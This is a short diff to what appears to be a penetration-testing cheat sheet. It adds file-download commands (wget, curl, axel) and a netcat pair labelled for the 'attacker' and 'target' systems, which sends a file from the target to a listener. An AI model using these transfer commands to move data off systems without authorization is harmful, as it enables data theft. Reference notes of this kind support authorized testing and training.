@@ -17,4 +17,14 @@ Python2
 ###### Download from bash
 ```
 > wget 192.168.1.1:443/file.txt
+> curl 192.168.1.1:443/file.txt -o file.txt
+> axel 192.168.1.1:443/file.txt -o file.txt
+```
+
+###### netcat
+```
+On the attacker system:
+> nc -lvp 80 > file.txt
+On the target system:
+> nc 192.168.1.1 80 < file.txt
 ```
